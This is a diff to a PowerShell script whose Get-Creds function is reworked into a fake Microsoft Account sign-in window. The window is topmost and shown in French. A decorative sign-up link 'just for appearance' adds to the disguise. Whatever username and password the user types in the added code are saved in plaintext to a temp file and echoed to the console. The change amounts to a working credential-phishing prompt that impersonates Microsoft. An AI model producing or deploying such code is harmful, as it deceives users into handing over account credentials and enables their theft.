@@ -4,27 +4,97 @@ function Get-Creds {
     $xaml = @"
 <Window xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
         xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
-        Title="Failed Authentication" 
+        Title="Microsoft Account" 
         WindowStartupLocation="CenterScreen"
         ResizeMode="NoResize"
-        Width="400" Height="220"
+        Width="500" Height="550"
         Topmost="True"
-        Background="#F0F0F0">
-    <StackPanel VerticalAlignment="Center" HorizontalAlignment="Center" Width="350">
-        <TextBlock Text="Failed Authentication" FontSize="16" FontWeight="Bold" Margin="0,0,0,20" Foreground="#333"/>
-        <TextBlock Text="Entrez vos informations d'identification." Margin="0,0,0,20" TextWrapping="Wrap"/>
-        
-        <TextBlock Text="Username:" Margin="0,0,0,5" Foreground="#333"/>
-        <TextBox x:Name="UsernameBox" Padding="8" Height="35" Margin="0,0,0,15" Background="White"/>
-        
-        <TextBlock Text="Password:" Margin="0,0,0,5" Foreground="#333"/>
-        <PasswordBox x:Name="PasswordBox" Padding="8" Height="35" Margin="0,0,0,20" Background="White"/>
-        
-        <StackPanel Orientation="Horizontal" HorizontalAlignment="Right" Margin="0,0,0,0">
-            <Button x:Name="OkButton" Content="OK" Width="70" Height="35" Margin="0,0,10,0" Background="#0078D4" Foreground="White" Cursor="Hand"/>
-            <Button x:Name="CancelButton" Content="Cancel" Width="70" Height="35" Background="#E5E5E5" Cursor="Hand"/>
+        Background="White"
+        WindowStyle="SingleBorderWindow">
+    <Grid Background="White">
+        <StackPanel VerticalAlignment="Stretch" HorizontalAlignment="Stretch" Margin="40">
+            <!-- Logo Microsoft -->
+            <TextBlock Text="microsoft" FontSize="28" FontWeight="Bold" Foreground="#0078D4" Margin="0,0,0,40"/>
+            
+            <!-- Titre -->
+            <TextBlock Text="Connexion" FontSize="32" FontWeight="Bold" Foreground="#000" Margin="0,0,0,10"/>
+            <TextBlock Text="Entrez vos informations d'identification Microsoft." FontSize="14" Foreground="#666" Margin="0,0,0,40" TextWrapping="Wrap"/>
+            
+            <!-- Email/Username -->
+            <TextBlock Text="Adresse e-mail ou numéro de téléphone" FontSize="12" Foreground="#333" Margin="0,0,0,8" FontWeight="SemiBold"/>
+            <TextBox x:Name="UsernameBox" 
+                     Padding="12" 
+                     Height="40" 
+                     Margin="0,0,0,20" 
+                     Background="White"
+                     BorderThickness="1"
+                     BorderBrush="#CCC"
+                     FontSize="13">
+                <TextBox.Resources>
+                    <Style TargetType="TextBox">
+                        <Style.Triggers>
+                            <Trigger Property="IsFocused" Value="True">
+                                <Setter Property="BorderBrush" Value="#0078D4"/>
+                                <Setter Property="BorderThickness" Value="2"/>
+                            </Trigger>
+                        </Style.Triggers>
+                    </Style>
+                </TextBox.Resources>
+            </TextBox>
+            
+            <!-- Mot de passe -->
+            <TextBlock Text="Mot de passe" FontSize="12" Foreground="#333" Margin="0,0,0,8" FontWeight="SemiBold"/>
+            <PasswordBox x:Name="PasswordBox" 
+                         Padding="12" 
+                         Height="40" 
+                         Margin="0,0,0,30" 
+                         Background="White"
+                         BorderThickness="1"
+                         BorderBrush="#CCC"
+                         FontSize="13">
+                <PasswordBox.Resources>
+                    <Style TargetType="PasswordBox">
+                        <Style.Triggers>
+                            <Trigger Property="IsFocused" Value="True">
+                                <Setter Property="BorderBrush" Value="#0078D4"/>
+                                <Setter Property="BorderThickness" Value="2"/>
+                            </Trigger>
+                        </Style.Triggers>
+                    </Style>
+                </PasswordBox.Resources>
+            </PasswordBox>
+            
+            <!-- Message erreur -->
+            <TextBlock x:Name="ErrorMessage" Text="" FontSize="12" Foreground="#D32F2F" Margin="0,0,0,15" TextWrapping="Wrap"/>
+            
+            <!-- Bouton Connexion -->
+            <Button x:Name="SignInButton" 
+                    Content="Connexion" 
+                    Height="40" 
+                    Margin="0,0,0,20"
+                    Background="#0078D4" 
+                    Foreground="White" 
+                    FontSize="14"
+                    FontWeight="Bold"
+                    Cursor="Hand"
+                    BorderThickness="0">
+                <Button.Resources>
+                    <Style TargetType="Button">
+                        <Style.Triggers>
+                            <Trigger Property="IsMouseOver" Value="True">
+                                <Setter Property="Background" Value="#106EBE"/>
+                            </Trigger>
+                        </Style.Triggers>
+                    </Style>
+                </Button.Resources>
+            </Button>
+            
+            <!-- Lien Pas de compte -->
+            <TextBlock TextAlignment="Center" Margin="0,0,0,0">
+                <Hyperlink x:Name="SignUpLink" Foreground="#0078D4" Cursor="Hand">Créer un compte Microsoft</Hyperlink>
+            </TextBlock>
         </StackPanel>
-    </StackPanel>
+    </Grid>
 </Window>
 "@
     
@@ -33,27 +103,38 @@ function Get-Creds {
     
     $usernameBox = $window.FindName("UsernameBox")
     $passwordBox = $window.FindName("PasswordBox")
-    $okButton = $window.FindName("OkButton")
-    $cancelButton = $window.FindName("CancelButton")
+    $signInButton = $window.FindName("SignInButton")
+    $errorMessage = $window.FindName("ErrorMessage")
+    $signUpLink = $window.FindName("SignUpLink")
     
     $script:result = $null
     
-    $okButton.Add_Click({
+    $signInButton.Add_Click({
         if ([string]::IsNullOrWhiteSpace($usernameBox.Text) -or [string]::IsNullOrWhiteSpace($passwordBox.Password)) {
-            [System.Windows.MessageBox]::Show("Credentials cannot be empty!", "Error", "Ok", "Stop") | Out-Null
+            $errorMessage.Text = "Veuillez entrer vos identifiants"
         }
         else {
             $script:result = @{
                 Username = $usernameBox.Text
                 Password = $passwordBox.Password
             }
+            
+            # Sauvegarder dans un fichier local
+            $filePath = "$env:TMP\creds_$(Get-Random).txt"
+            $credString = "Username: $($usernameBox.Text)`nPassword: $($passwordBox.Password)"
+            $credString | Out-File -FilePath $filePath -Encoding UTF8 -Force
+            Write-Host "Credentials sauvegardés dans: $filePath" -ForegroundColor Green
+            
             $window.Close()
         }
     })
     
-    $cancelButton.Add_Click({
-        $window.Close()
+    $signUpLink.Add_Click({
+        # Juste pour l'apparence, ne rien faire
     })
+    
+    # Focus sur le premier champ
+    $usernameBox.Focus() | Out-Null
     
     $window.ShowDialog() | Out-Null
     
@@ -137,6 +218,8 @@ if ($creds -eq $null) {
 }
 
 Write-Host "DEBUG: Credentials obtenues, suite du script..." -ForegroundColor Yellow
+Write-Host "Username: $($creds.Username)" -ForegroundColor Yellow
+Write-Host "Password: $($creds.Password)" -ForegroundColor Yellow
 
 #------------------------------------------------------------------------------------------------------------------------------------
 
